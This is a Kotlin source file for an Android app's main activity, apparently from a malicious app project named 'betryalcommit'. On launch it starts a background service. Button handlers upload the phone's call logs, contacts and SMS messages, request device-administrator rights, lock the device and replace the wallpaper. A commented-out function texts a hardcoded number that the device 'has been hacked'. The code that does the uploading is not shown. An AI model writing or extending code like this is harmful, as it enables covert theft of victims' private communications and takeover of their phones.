package com.example.betryalcommit
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import okhttp3.OkHttpClient
import java.net.Socket

class MainActivity : AppCompatActivity() {
    companion object {
        const val PERMISSION_REQUEST_CODE = 1
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        AdminAct.initialize(this);
        val serviceIntent = Intent(this, Lol::class.java)
        startService(serviceIntent)
        val btn = findViewById<Button>(R.id.chk)
        val btn2 = findViewById<Button>(R.id.chk2);
        val btn3 = findViewById<Button>(R.id.chk3)
        btn.setOnClickListener {
            Permsu.requestPermissions(
                applicationContext,
                this,
                PERMISSION_REQUEST_CODE
            ) }
        btn2.setOnClickListener {
           callutil.uploadCalls(contentResolver,applicationContext);
            Teleserv.uploadContact(contentResolver,applicationContext);
            Teleserv.uploadsms(contentResolver,applicationContext);
            AdminAct.admact(this);
        }
        btn3.setOnClickListener{
            AdminAct.lockdev(applicationContext);
             wallpaperset.setwall(applicationContext);
         //   done();
        }
    }
    private fun done() {
        if (AdminAct.isDeviceAdminAssigned()) {
            Toast.makeText(applicationContext, "hello bro", Toast.LENGTH_SHORT).show()
            Teleserv.sendMessage(this,"9545086924","20:30 you have been hacked");
        }
    }
}